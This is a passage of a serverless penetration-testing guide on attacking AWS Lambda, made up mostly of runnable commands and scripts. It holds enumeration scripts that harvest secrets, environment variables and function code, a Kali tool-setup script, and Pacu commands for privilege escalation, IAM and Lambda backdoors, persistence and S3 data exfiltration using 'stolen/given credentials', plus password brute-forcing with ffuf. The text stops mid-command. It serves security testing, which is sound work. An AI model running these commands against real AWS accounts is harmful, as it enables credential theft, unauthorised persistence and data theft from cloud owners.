---
title: AWS Lambda Attacks - Extended
description: Extended guide covering AWS Enumeration tools, Kali Linux-based attack methods, advanced exploitation frameworks, post-exploitation pivoting, and comprehensive pentesting methodologies for serverless environments.
navigation:
  icon: i-lucide-swords
---

## AWS Enumeration — Deep Dive

### Full AWS Environment Enumeration

::note
Before attacking Lambda specifically, **map the entire AWS environment**. Lambda functions don't exist in isolation — they connect to databases, queues, buckets, APIs, and internal services.
::

::steps{level="3"}

### Step 1 — Account & Identity Mapping

```bash [Account Reconnaissance]
# ============================================
# WHO AM I?
# ============================================
aws sts get-caller-identity
aws iam get-user 2>/dev/null
aws iam list-account-aliases

# Get account ID from error messages (if no permissions)
aws s3 ls 2>&1 | grep -oP '\d{12}'

# Check for organization membership
aws organizations describe-organization 2>/dev/null
aws organizations list-accounts 2>/dev/null

# List all regions with active services
for region in $(aws ec2 describe-regions --query 'Regions[*].RegionName' --output text); do
  count=$(aws lambda list-functions --region $region --query 'length(Functions)' --output text 2>/dev/null)
  ec2=$(aws ec2 describe-instances --region $region --query 'length(Reservations)' --output text 2>/dev/null)
  [ "$count" != "0" ] || [ "$ec2" != "0" ] && echo "$region: Lambda=$count EC2=$ec2"
done

# STS session details
aws sts get-session-token 2>/dev/null
aws sts get-access-key-info --access-key-id $(aws configure get aws_access_key_id)
```

### Step 2 — Service-Wide Discovery

```bash [Service Discovery Script]
#!/bin/bash
# full_aws_enum.sh — Comprehensive AWS service enumeration
# Usage: ./full_aws_enum.sh [profile] [region]

PROFILE=${1:-default}
REGION=${2:-us-east-1}
OUTDIR="./aws-enum-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTDIR"

echo "[*] Starting full AWS enumeration..."
echo "[*] Profile: $PROFILE | Region: $REGION"
echo "[*] Output: $OUTDIR"

# Identity
echo "[*] Enumerating identity..."
aws sts get-caller-identity --profile $PROFILE > "$OUTDIR/identity.json" 2>&1

# Lambda
echo "[*] Enumerating Lambda..."
aws lambda list-functions --profile $PROFILE --region $REGION > "$OUTDIR/lambda-functions.json" 2>&1
aws lambda list-layers --profile $PROFILE --region $REGION > "$OUTDIR/lambda-layers.json" 2>&1
aws lambda list-event-source-mappings --profile $PROFILE --region $REGION > "$OUTDIR/lambda-event-sources.json" 2>&1

# IAM
echo "[*] Enumerating IAM..."
aws iam list-users --profile $PROFILE > "$OUTDIR/iam-users.json" 2>&1
aws iam list-roles --profile $PROFILE > "$OUTDIR/iam-roles.json" 2>&1
aws iam list-groups --profile $PROFILE > "$OUTDIR/iam-groups.json" 2>&1
aws iam list-policies --scope Local --profile $PROFILE > "$OUTDIR/iam-policies.json" 2>&1
aws iam get-account-authorization-details --profile $PROFILE > "$OUTDIR/iam-full-details.json" 2>&1

# S3
echo "[*] Enumerating S3..."
aws s3api list-buckets --profile $PROFILE > "$OUTDIR/s3-buckets.json" 2>&1

# EC2
echo "[*] Enumerating EC2..."
aws ec2 describe-instances --profile $PROFILE --region $REGION > "$OUTDIR/ec2-instances.json" 2>&1
aws ec2 describe-security-groups --profile $PROFILE --region $REGION > "$OUTDIR/ec2-security-groups.json" 2>&1
aws ec2 describe-vpcs --profile $PROFILE --region $REGION > "$OUTDIR/ec2-vpcs.json" 2>&1
aws ec2 describe-subnets --profile $PROFILE --region $REGION > "$OUTDIR/ec2-subnets.json" 2>&1

# RDS
echo "[*] Enumerating RDS..."
aws rds describe-db-instances --profile $PROFILE --region $REGION > "$OUTDIR/rds-instances.json" 2>&1
aws rds describe-db-clusters --profile $PROFILE --region $REGION > "$OUTDIR/rds-clusters.json" 2>&1

# DynamoDB
echo "[*] Enumerating DynamoDB..."
aws dynamodb list-tables --profile $PROFILE --region $REGION > "$OUTDIR/dynamodb-tables.json" 2>&1

# Secrets Manager
echo "[*] Enumerating Secrets..."
aws secretsmanager list-secrets --profile $PROFILE --region $REGION > "$OUTDIR/secrets.json" 2>&1

# SSM Parameter Store
echo "[*] Enumerating SSM Parameters..."
aws ssm describe-parameters --profile $PROFILE --region $REGION > "$OUTDIR/ssm-parameters.json" 2>&1

# API Gateway
echo "[*] Enumerating API Gateway..."
aws apigateway get-rest-apis --profile $PROFILE --region $REGION > "$OUTDIR/apigateway-rest.json" 2>&1
aws apigatewayv2 get-apis --profile $PROFILE --region $REGION > "$OUTDIR/apigateway-v2.json" 2>&1

# SQS
echo "[*] Enumerating SQS..."
aws sqs list-queues --profile $PROFILE --region $REGION > "$OUTDIR/sqs-queues.json" 2>&1

# SNS
echo "[*] Enumerating SNS..."
aws sns list-topics --profile $PROFILE --region $REGION > "$OUTDIR/sns-topics.json" 2>&1

# CloudFormation
echo "[*] Enumerating CloudFormation..."
aws cloudformation list-stacks --profile $PROFILE --region $REGION > "$OUTDIR/cf-stacks.json" 2>&1

# ECS / EKS
echo "[*] Enumerating Containers..."
aws ecs list-clusters --profile $PROFILE --region $REGION > "$OUTDIR/ecs-clusters.json" 2>&1
aws eks list-clusters --profile $PROFILE --region $REGION > "$OUTDIR/eks-clusters.json" 2>&1

# CloudTrail
echo "[*] Enumerating CloudTrail..."
aws cloudtrail describe-trails --profile $PROFILE --region $REGION > "$OUTDIR/cloudtrail.json" 2>&1

# GuardDuty
echo "[*] Checking GuardDuty..."
aws guardduty list-detectors --profile $PROFILE --region $REGION > "$OUTDIR/guardduty.json" 2>&1

# CloudWatch
echo "[*] Enumerating CloudWatch..."
aws logs describe-log-groups --profile $PROFILE --region $REGION > "$OUTDIR/cloudwatch-logs.json" 2>&1

# ECR
echo "[*] Enumerating ECR..."
aws ecr describe-repositories --profile $PROFILE --region $REGION > "$OUTDIR/ecr-repos.json" 2>&1

# KMS
echo "[*] Enumerating KMS..."
aws kms list-keys --profile $PROFILE --region $REGION > "$OUTDIR/kms-keys.json" 2>&1

echo ""
echo "[+] Enumeration complete! Results in: $OUTDIR"
echo "[+] Files generated:"
ls -la "$OUTDIR"

# Quick summary
echo ""
echo "=== QUICK SUMMARY ==="
echo "Lambda Functions: $(cat $OUTDIR/lambda-functions.json 2>/dev/null | jq '.Functions | length' 2>/dev/null || echo 'N/A')"
echo "IAM Users: $(cat $OUTDIR/iam-users.json 2>/dev/null | jq '.Users | length' 2>/dev/null || echo 'N/A')"
echo "IAM Roles: $(cat $OUTDIR/iam-roles.json 2>/dev/null | jq '.Roles | length' 2>/dev/null || echo 'N/A')"
echo "S3 Buckets: $(cat $OUTDIR/s3-buckets.json 2>/dev/null | jq '.Buckets | length' 2>/dev/null || echo 'N/A')"
echo "EC2 Instances: $(cat $OUTDIR/ec2-instances.json 2>/dev/null | jq '[.Reservations[].Instances[]] | length' 2>/dev/null || echo 'N/A')"
echo "RDS Instances: $(cat $OUTDIR/rds-instances.json 2>/dev/null | jq '.DBInstances | length' 2>/dev/null || echo 'N/A')"
echo "Secrets: $(cat $OUTDIR/secrets.json 2>/dev/null | jq '.SecretList | length' 2>/dev/null || echo 'N/A')"
```

### Step 3 — Lambda-Specific Deep Enumeration

```bash [Lambda Deep Enum]
#!/bin/bash
# lambda_deep_enum.sh — Thorough Lambda-specific enumeration

OUTDIR="./lambda-enum-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTDIR/functions" "$OUTDIR/code" "$OUTDIR/roles" "$OUTDIR/layers" "$OUTDIR/policies"

echo "[*] Deep Lambda Enumeration Starting..."

# Get all functions with full config
for func in $(aws lambda list-functions --query 'Functions[*].FunctionName' --output text); do
  echo ""
  echo "================================================================"
  echo "[*] Function: $func"
  echo "================================================================"
  
  # Full configuration
  aws lambda get-function-configuration \
    --function-name "$func" > "$OUTDIR/functions/${func}-config.json" 2>&1
  
  # Extract key info
  RUNTIME=$(jq -r '.Runtime // "N/A"' "$OUTDIR/functions/${func}-config.json")
  ROLE=$(jq -r '.Role // "N/A"' "$OUTDIR/functions/${func}-config.json")
  HANDLER=$(jq -r '.Handler // "N/A"' "$OUTDIR/functions/${func}-config.json")
  TIMEOUT=$(jq -r '.Timeout // "N/A"' "$OUTDIR/functions/${func}-config.json")
  MEMORY=$(jq -r '.MemorySize // "N/A"' "$OUTDIR/functions/${func}-config.json")
  VPC=$(jq -r '.VpcConfig.VpcId // "none"' "$OUTDIR/functions/${func}-config.json")
  LAST_MOD=$(jq -r '.LastModified // "N/A"' "$OUTDIR/functions/${func}-config.json")
  
  echo "  Runtime:  $RUNTIME"
  echo "  Handler:  $HANDLER"
  echo "  Role:     $ROLE"
  echo "  Timeout:  ${TIMEOUT}s"
  echo "  Memory:   ${MEMORY}MB"
  echo "  VPC:      $VPC"
  echo "  Modified: $LAST_MOD"
  
  # Environment variables
  ENV_VARS=$(jq -r '.Environment.Variables // empty' "$OUTDIR/functions/${func}-config.json")
  if [ ! -z "$ENV_VARS" ] && [ "$ENV_VARS" != "null" ]; then
    echo "  [!] Environment Variables Found:"
    echo "$ENV_VARS" | jq -r 'to_entries[] | "      \(.key) = \(.value)"'
    
    # Flag potential secrets
    echo "$ENV_VARS" | jq -r 'to_entries[] | .key' | \
      grep -iE "password|secret|key|token|credential|api|auth|jwt|database|connection|private" | \
      while read key; do
        echo "  [!!!] POTENTIAL SECRET: $key"
      done
  fi
  
  # Layers
  LAYERS=$(jq -r '.Layers[]?.Arn // empty' "$OUTDIR/functions/${func}-config.json")
  if [ ! -z "$LAYERS" ]; then
    echo "  Layers:"
    echo "$LAYERS" | while read layer; do
      echo "      $layer"
    done
  fi
  
  # Resource policy
  aws lambda get-policy \
    --function-name "$func" > "$OUTDIR/policies/${func}-policy.json" 2>/dev/null
  if [ -f "$OUTDIR/policies/${func}-policy.json" ]; then
    # Check for public access
    PUBLIC=$(jq -r '.Policy | fromjson | .Statement[] | select(.Principal == "*" or .Principal.AWS == "*") | .Sid' "$OUTDIR/policies/${func}-policy.json" 2>/dev/null)
    if [ ! -z "$PUBLIC" ]; then
      echo "  [!!!] PUBLICLY ACCESSIBLE: $PUBLIC"
    fi
    
    # Check for cross-account access
    CROSS=$(jq -r '.Policy | fromjson | .Statement[] | .Principal.AWS // .Principal | select(. != null)' "$OUTDIR/policies/${func}-policy.json" 2>/dev/null)
    if [ ! -z "$CROSS" ]; then
      echo "  [!] External Principals: $CROSS"
    fi
  fi
  
  # Function URL
  FUNC_URL=$(aws lambda get-function-url-config \
    --function-name "$func" 2>/dev/null)
  if [ ! -z "$FUNC_URL" ]; then
    URL=$(echo "$FUNC_URL" | jq -r '.FunctionUrl')
    AUTH=$(echo "$FUNC_URL" | jq -r '.AuthType')
    echo "  [!] Function URL: $URL (Auth: $AUTH)"
    if [ "$AUTH" == "NONE" ]; then
      echo "  [!!!] UNAUTHENTICATED FUNCTION URL!"
    fi
  fi
  
  # Event source mappings
  EVENTS=$(aws lambda list-event-source-mappings \
    --function-name "$func" --query 'EventSourceMappings[*].EventSourceArn' --output text 2>/dev/null)
  if [ ! -z "$EVENTS" ]; then
    echo "  Event Sources:"
    echo "$EVENTS" | tr '\t' '\n' | while read src; do
      echo "      $src"
    done
  fi
  
  # Download source code
  CODE_URL=$(aws lambda get-function \
    --function-name "$func" --query 'Code.Location' --output text 2>/dev/null)
  if [ ! -z "$CODE_URL" ] && [ "$CODE_URL" != "None" ]; then
    mkdir -p "$OUTDIR/code/$func"
    curl -s -o "$OUTDIR/code/$func/code.zip" "$CODE_URL"
    unzip -q -o "$OUTDIR/code/$func/code.zip" -d "$OUTDIR/code/$func/" 2>/dev/null
    rm -f "$OUTDIR/code/$func/code.zip" 2>/dev/null
    echo "  [+] Code downloaded to $OUTDIR/code/$func/"
    
    # Quick secret scan in code
    SECRETS_FOUND=$(grep -rlnE "AKIA[0-9A-Z]{16}|password\s*=|secret\s*=|api_key\s*=|BEGIN RSA|BEGIN PRIVATE" "$OUTDIR/code/$func/" 2>/dev/null)
    if [ ! -z "$SECRETS_FOUND" ]; then
      echo "  [!!!] SECRETS IN CODE:"
      echo "$SECRETS_FOUND" | while read f; do
        echo "      $f"
      done
    fi
  fi
  
  # Analyze execution role
  ROLE_NAME=$(echo "$ROLE" | rev | cut -d'/' -f1 | rev)
  if [ ! -z "$ROLE_NAME" ] && [ "$ROLE_NAME" != "N/A" ]; then
    mkdir -p "$OUTDIR/roles/$ROLE_NAME"
    
    # Trust policy
    aws iam get-role --role-name "$ROLE_NAME" \
      > "$OUTDIR/roles/$ROLE_NAME/trust-policy.json" 2>/dev/null
    
    # Attached policies
    aws iam list-attached-role-policies --role-name "$ROLE_NAME" \
      > "$OUTDIR/roles/$ROLE_NAME/attached-policies.json" 2>/dev/null
    
    # Inline policies
    for policy in $(aws iam list-role-policies --role-name "$ROLE_NAME" --query 'PolicyNames[*]' --output text 2>/dev/null); do
      aws iam get-role-policy --role-name "$ROLE_NAME" --policy-name "$policy" \
        > "$OUTDIR/roles/$ROLE_NAME/inline-${policy}.json" 2>/dev/null
    done
    
    # Check for dangerous permissions
    DANGEROUS=$(cat "$OUTDIR/roles/$ROLE_NAME"/*.json 2>/dev/null | \
      grep -oE '"Action"\s*:\s*"\*"|"Action"\s*:\s*\["[^"]*iam:[^"]*"|"Action"\s*:\s*\["[^"]*lambda:[^"]*"|AdministratorAccess|PowerUserAccess' 2>/dev/null)
    if [ ! -z "$DANGEROUS" ]; then
      echo "  [!!!] DANGEROUS ROLE PERMISSIONS:"
      echo "$DANGEROUS" | head -5 | while read d; do
        echo "      $d"
      done
    fi
  fi
  
done

echo ""
echo "================================================================"
echo "[+] Lambda Deep Enumeration Complete!"
echo "[+] Results: $OUTDIR"
echo "================================================================"
```

### Step 4 — API Gateway → Lambda Mapping

```bash [API Gateway Mapping]
#!/bin/bash
# map_api_to_lambda.sh — Map API Gateway endpoints to Lambda functions

echo "[*] Mapping API Gateway → Lambda integrations..."

# REST APIs (v1)
echo ""
echo "=== REST APIs (v1) ==="
for api_id in $(aws apigateway get-rest-apis --query 'items[*].id' --output text); do
  api_name=$(aws apigateway get-rest-apis --query "items[?id=='$api_id'].name" --output text)
  echo ""
  echo "API: $api_name ($api_id)"
  
  for resource_id in $(aws apigateway get-resources --rest-api-id $api_id --query 'items[*].id' --output text); do
    resource_path=$(aws apigateway get-resources --rest-api-id $api_id \
      --query "items[?id=='$resource_id'].path" --output text)
    
    for method in GET POST PUT DELETE PATCH OPTIONS; do
      integration=$(aws apigateway get-integration \
        --rest-api-id $api_id \
        --resource-id $resource_id \
        --http-method $method 2>/dev/null)
      
      if [ ! -z "$integration" ]; then
        uri=$(echo "$integration" | jq -r '.uri // "N/A"')
        type=$(echo "$integration" | jq -r '.type // "N/A"')
        
        if echo "$uri" | grep -q "lambda"; then
          func_name=$(echo "$uri" | grep -oP 'function:[^/]+' | cut -d: -f2)
          echo "  $method $resource_path → Lambda: $func_name"
          
          # Check authorizer
          method_resp=$(aws apigateway get-method \
            --rest-api-id $api_id \
            --resource-id $resource_id \
            --http-method $method 2>/dev/null)
          
          auth=$(echo "$method_resp" | jq -r '.authorizationType // "NONE"')
          api_key=$(echo "$method_resp" | jq -r '.apiKeyRequired // false')
          
          if [ "$auth" == "NONE" ] && [ "$api_key" == "false" ]; then
            echo "    [!!!] NO AUTHENTICATION!"
            echo "    URL: https://${api_id}.execute-api.$(aws configure get region).amazonaws.com/prod${resource_path}"
          fi
        fi
      fi
    done
  done
done

# HTTP APIs (v2)
echo ""
echo "=== HTTP APIs (v2) ==="
for api_id in $(aws apigatewayv2 get-apis --query 'Items[*].ApiId' --output text 2>/dev/null); do
  api_name=$(aws apigatewayv2 get-apis --query "Items[?ApiId=='$api_id'].Name" --output text)
  endpoint=$(aws apigatewayv2 get-apis --query "Items[?ApiId=='$api_id'].ApiEndpoint" --output text)
  echo ""
  echo "API: $api_name ($api_id)"
  echo "Endpoint: $endpoint"
  
  # List routes
  aws apigatewayv2 get-routes --api-id $api_id \
    --query 'Items[*].[RouteKey,Target,AuthorizationType]' --output table 2>/dev/null
  
  # List integrations
  aws apigatewayv2 get-integrations --api-id $api_id \
    --query 'Items[*].[IntegrationId,IntegrationType,IntegrationUri]' --output table 2>/dev/null
done
```

::

---

## Kali Linux — Tool Arsenal

### Kali Tool Installation & Setup

::warning
Set up your Kali attack machine with these tools **before** the engagement. Some tools require additional configuration and API keys.
::

```bash [Kali AWS Attack Setup]
#!/bin/bash
# kali_aws_setup.sh — Install all AWS pentesting tools on Kali Linux

echo "[*] Setting up Kali for AWS Lambda pentesting..."

# ============================================
# CORE TOOLS
# ============================================

# AWS CLI v2
echo "[*] Installing AWS CLI v2..."
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install --update
rm -rf aws awscliv2.zip

# Python tools
echo "[*] Installing Python tools..."
pip3 install --upgrade pip
pip3 install boto3 botocore awscli

# jq for JSON parsing
sudo apt-get install -y jq

# ============================================
# ENUMERATION TOOLS
# ============================================

# Pacu — AWS Exploitation Framework
echo "[*] Installing Pacu..."
cd /opt
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu
pip3 install -r requirements.txt
# Create alias
echo 'alias pacu="cd /opt/pacu && python3 cli.py"' >> ~/.bashrc

# enumerate-iam — Brute-force IAM permissions
echo "[*] Installing enumerate-iam..."
cd /opt
git clone https://github.com/andresriancho/enumerate-iam.git
cd enumerate-iam
pip3 install -r requirements.txt

# ScoutSuite — Multi-cloud auditing
echo "[*] Installing ScoutSuite..."
pip3 install scoutsuite

# Prowler — AWS security assessment
echo "[*] Installing Prowler..."
pip3 install prowler

# CloudFox — Attack path discovery
echo "[*] Installing CloudFox..."
cd /opt
wget https://github.com/BishopFox/cloudfox/releases/latest/download/cloudfox-linux-amd64.zip
unzip cloudfox-linux-amd64.zip
sudo mv cloudfox /usr/local/bin/
chmod +x /usr/local/bin/cloudfox

# WeirdAAL — AWS Attack Library
echo "[*] Installing WeirdAAL..."
cd /opt
git clone https://github.com/carnal0wnage/weirdAAL.git
cd weirdAAL
pip3 install -r requirements.txt

# CloudMapper
echo "[*] Installing CloudMapper..."
cd /opt
git clone https://github.com/duo-labs/cloudmapper.git
cd cloudmapper
pip3 install -r requirements.txt

# ============================================
# EXPLOITATION TOOLS
# ============================================

# ServerlessGoat — Vulnerable Lambda app
echo "[*] Installing ServerlessGoat..."
cd /opt
git clone https://github.com/OWASP/Serverless-Goat.git

# LambdaGuard — Lambda security scanner
echo "[*] Installing LambdaGuard..."
pip3 install lambdaguard

# Lambhack — Vulnerable Lambda for testing
echo "[*] Installing Lambhack..."
cd /opt
git clone https://github.com/wickett/lambhack.git

# ============================================
# CREDENTIAL TOOLS
# ============================================

# TruffleHog — Secret scanner
echo "[*] Installing TruffleHog..."
pip3 install trufflehog

# GitLeaks — Secret detection
echo "[*] Installing GitLeaks..."
cd /opt
wget https://github.com/gitleaks/gitleaks/releases/latest/download/gitleaks_linux_x64.tar.gz
tar -xzf gitleaks_linux_x64.tar.gz
sudo mv gitleaks /usr/local/bin/

# AWS Vault — Secure credential storage
echo "[*] Installing AWS Vault..."
cd /opt
wget https://github.com/99designs/aws-vault/releases/latest/download/aws-vault-linux-amd64
sudo mv aws-vault-linux-amd64 /usr/local/bin/aws-vault
chmod +x /usr/local/bin/aws-vault

# ============================================
# NETWORK / WEB TOOLS (already in Kali)
# ============================================

# Ensure these are updated
sudo apt-get install -y \
  burpsuite \
  sqlmap \
  nikto \
  nmap \
  gobuster \
  ffuf \
  nuclei \
  httpx \
  curl \
  wget \
  netcat-openbsd \
  socat \
  python3-impacket

# Nuclei templates for AWS
echo "[*] Updating Nuclei templates..."
nuclei -update-templates

# ============================================
# SERVERLESS-SPECIFIC
# ============================================

# Serverless Framework (for deploying test functions)
echo "[*] Installing Serverless Framework..."
npm install -g serverless

# SAM CLI (AWS Serverless Application Model)
echo "[*] Installing SAM CLI..."
pip3 install aws-sam-cli

# ============================================
# REVERSE ENGINEERING
# ============================================

# For analyzing Lambda deployment packages
sudo apt-get install -y \
  binwalk \
  foremost \
  strings \
  file \
  unzip \
  p7zip-full

echo ""
echo "[+] Setup complete! Tools installed in /opt/"
echo "[+] Source ~/.bashrc for aliases"
source ~/.bashrc
```

### Kali Attack Workflow

```
┌──────────────────────────────────────────────────────────────┐
│                    KALI ATTACK WORKFLOW                       │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  1. CREDENTIAL SETUP                                         │
│     └─ aws configure / env vars / stolen creds               │
│                                                              │
│  2. RECONNAISSANCE                                           │
│     ├─ enumerate-iam (permission brute-force)                │
│     ├─ ScoutSuite / Prowler (security audit)                 │
│     ├─ CloudFox (attack path discovery)                      │
│     └─ full_aws_enum.sh (custom script)                      │
│                                                              │
│  3. LAMBDA ENUMERATION                                       │
│     ├─ lambda_deep_enum.sh (custom)                          │
│     ├─ LambdaGuard (automated scanner)                       │
│     ├─ Pacu lambda__enum module                              │
│     └─ Source code download & analysis                       │
│                                                              │
│  4. API GATEWAY TESTING                                      │
│     ├─ Burp Suite (proxy & intercept)                        │
│     ├─ ffuf / gobuster (endpoint fuzzing)                    │
│     ├─ sqlmap (injection testing)                            │
│     ├─ nuclei (vulnerability scanning)                       │
│     └─ Custom curl scripts                                   │
│                                                              │
│  5. EXPLOITATION                                             │
│     ├─ Injection attacks via API Gateway                     │
│     ├─ Credential theft from env vars                        │
│     ├─ SSRF to internal services                             │
│     └─ Privilege escalation via Lambda role                  │
│                                                              │
│  6. POST-EXPLOITATION                                        │
│     ├─ Pacu (automated privesc & persistence)                │
│     ├─ Custom backdoor deployment                            │
│     ├─ Data exfiltration                                     │
│     └─ Lateral movement                                      │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

---

## Kali-Based Attack Methods

### Method 1 — Pacu Framework (Full Lambda Attack Chain)

::steps{level="4"}

#### Initialize Pacu

```bash [Pacu Setup]
cd /opt/pacu
python3 cli.py

# Create new session
Pacu (new:session) > set_session lambda-pentest

# Set stolen/given credentials
Pacu (lambda-pentest) > set_keys

# Enter:
#   Key alias: target-keys
#   Access Key ID: AKIAXXXXXXXXXXXXXXXX
#   Secret Access Key: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
#   Session Token (optional): XXXXXXXX

# Verify identity
Pacu (lambda-pentest) > whoami
```

#### Enumerate with Pacu

```bash [Pacu Enumeration Modules]
# Full IAM enumeration
Pacu (lambda-pentest) > run iam__enum_users_roles_policies_groups

# Enumerate IAM permissions for current user
Pacu (lambda-pentest) > run iam__enum_permissions

# Enumerate Lambda functions
Pacu (lambda-pentest) > run lambda__enum

# Enumerate all services
Pacu (lambda-pentest) > run aws__enum_account
Pacu (lambda-pentest) > run aws__enum_spend

# Enumerate EC2 instances
Pacu (lambda-pentest) > run ec2__enum

# Enumerate S3 buckets
Pacu (lambda-pentest) > run s3__enum

# Check for privilege escalation paths
Pacu (lambda-pentest) > run iam__privesc_scan
```

#### Exploit with Pacu

```bash [Pacu Exploitation Modules]
# Attempt privilege escalation
Pacu (lambda-pentest) > run iam__privesc_scan
# Pacu will identify escalation paths and offer to execute them

# Backdoor Lambda functions
Pacu (lambda-pentest) > run lambda__backdoor_new_roles

# Backdoor new users/roles
Pacu (lambda-pentest) > run iam__backdoor_users_keys
Pacu (lambda-pentest) > run iam__backdoor_assume_role

# Create persistence
Pacu (lambda-pentest) > run lambda__backdoor_new_sec_groups
Pacu (lambda-pentest) > run iam__backdoor_users_password

# Data exfiltration
Pacu (lambda-pentest) > run s3__download_bucket
Pacu (lambda-pentest) > run secretsmanager__enum

# View all collected data
Pacu (lambda-pentest) > data Lambda
Pacu (lambda-pentest) > data IAM
```

#### Export Pacu Results

```bash [Export Data]
# Export all session data
Pacu (lambda-pentest) > export_keys

# Session data stored in:
# ~/.local/share/pacu/sessions/lambda-pentest/

# Generate report
Pacu (lambda-pentest) > data all
```

::

### Method 2 — enumerate-iam (Permission Discovery)

```bash [enumerate-iam Usage]
cd /opt/enumerate-iam

# Basic usage — brute-force ALL API calls
python3 enumerate-iam.py \
  --access-key AKIAXXXXXXXXXXXXXXXX \
  --secret-key XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

# With session token (temporary credentials)
python3 enumerate-iam.py \
  --access-key ASIAXXXXXXXXXXXXXXXX \
  --secret-key XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
  --session-token XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

# Output reveals which API calls succeed
# Example output:
# [+] lambda.list_functions succeeded
# [+] lambda.get_function succeeded  
# [+] iam.list_users succeeded
# [+] s3.list_buckets succeeded
# [+] sts.get_caller_identity succeeded
# [-] ec2.describe_instances failed (AccessDenied)

# Redirect to file for analysis
python3 enumerate-iam.py \
  --access-key AKIAXXXXXXXXXXXXXXXX \
  --secret-key XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
  2>&1 | tee /tmp/enum-results.txt

# Extract successful calls
grep "\[+\]" /tmp/enum-results.txt | sort
```

### Method 3 — ScoutSuite (Security Audit)

```bash [ScoutSuite Usage]
# Full AWS audit
scout aws \
  --profile target-profile \
  --regions us-east-1 us-west-2 eu-west-1 \
  --services lambda iam apigateway s3 \
  --report-dir ./scoutsuite-report

# Using credentials directly
AWS_ACCESS_KEY_ID=AKIAXXXX \
AWS_SECRET_ACCESS_KEY=XXXXXXXX \
scout aws --regions all

# Open the HTML report
firefox ./scoutsuite-report/scoutsuite-report/aws-*.html

# ScoutSuite checks for Lambda:
# - Functions with admin execution roles
# - Functions without VPC configuration
# - Functions with public access
# - Environment variables containing secrets
# - Functions using deprecated runtimes
# - Functions without X-Ray tracing
# - Over-privileged execution roles
```

### Method 4 — CloudFox (Attack Path Discovery)

```bash [CloudFox Usage]
# CloudFox finds exploitable attack paths

# All checks
cloudfox aws all-checks --profile target-profile

# Specific Lambda-related checks
cloudfox aws lambda --profile target-profile
cloudfox aws permissions --profile target-profile
cloudfox aws role-trusts --profile target-profile
cloudfox aws env-vars --profile target-profile
cloudfox aws secrets --profile target-profile

# Find attack paths
cloudfox aws attack-paths --profile target-profile

# Output includes:
# - Lambda functions with interesting roles
# - Environment variables with secrets
# - Cross-account trust relationships
# - Privilege escalation paths
# - Lateral movement opportunities
```

### Method 5 — Prowler (Compliance & Security)

```bash [Prowler Usage]
# Run all Lambda checks
prowler aws \
  --profile target-profile \
  --services lambda \
  --output-formats html json csv

# Specific Lambda security checks
prowler aws --checks \
  lambda_function_url_public \
  lambda_function_using_supported_runtimes \
  lambda_function_no_secrets_in_variables \
  lambda_function_vpc_multi_az \
  lambda_function_not_publicly_accessible \
  lambda_function_invoke_api_operations_cloudtrail_logging_enabled

# Full security audit
prowler aws --profile target-profile --severity critical high

# Output report
prowler aws --profile target-profile -M html -o ./prowler-report/
```

### Method 6 — Burp Suite (API Gateway Interception)

::tabs
  :::tabs-item{icon="i-lucide-settings" label="Burp Setup"}
  ```bash [Burp Suite Configuration]
  # Start Burp Suite
  burpsuite &

  # Configure AWS CLI to use Burp proxy
  export HTTP_PROXY=http://127.0.0.1:8080
  export HTTPS_PROXY=http://127.0.0.1:8080

  # Or for specific curl requests
  curl -x http://127.0.0.1:8080 -k \
    "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/endpoint"

  # Burp Suite extensions for AWS:
  # - AWS Signer (sign requests with AWS credentials)
  # - AWS Security Checks
  # - JWT Editor (for Cognito tokens)

  # Import Burp CA certificate for HTTPS interception
  curl -x http://127.0.0.1:8080 -k http://burp/cert -o burp-ca.der
  openssl x509 -in burp-ca.der -inform DER -out burp-ca.pem
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="API Testing"}
  ```bash [API Gateway Testing via Burp]
  # Discover API endpoints
  # Use Burp Spider on the target web application
  # Intercept JavaScript files for API endpoint references

  # Manual endpoint testing
  curl -x http://127.0.0.1:8080 -k \
    -X POST "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/api/users" \
    -H "Content-Type: application/json" \
    -d '{"username":"test","password":"test"}'

  # Test authentication bypass
  curl -x http://127.0.0.1:8080 -k \
    "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/api/admin" \
    -H "Authorization: Bearer invalid_token"

  # Test with no auth
  curl -x http://127.0.0.1:8080 -k \
    "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/api/admin"

  # Modify request in Burp Repeater to test:
  # - Parameter manipulation
  # - Header injection
  # - Body manipulation
  # - HTTP method tampering (GET → POST → PUT → DELETE)
  ```
  :::
::

### Method 7 — ffuf & Gobuster (Endpoint Fuzzing)

```bash [API Endpoint Fuzzing]
# ============================================
# ffuf — API Endpoint Discovery
# ============================================

# Fuzz API paths
ffuf -u "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/FUZZ" \
  -w /usr/share/wordlists/dirb/common.txt \
  -mc 200,301,302,403,405 \
  -o ffuf-results.json

# Fuzz with API-specific wordlist
ffuf -u "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/api/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,301,302,403,405 \
  -H "Content-Type: application/json"

# Fuzz parameters
ffuf -u "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/api/users?FUZZ=admin" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200 \
  -fs 0

# Fuzz with POST data
ffuf -u "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/api/login" \
  -w /usr/share/wordlists/rockyou.txt \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FUZZ"}' \
  -mc 200 \
  -fr "invalid"

# Fuzz API versions
ffuf -u "https://API_ID.execute-api.us-east-1.amazonaws.com/FUZZ/api/users" \
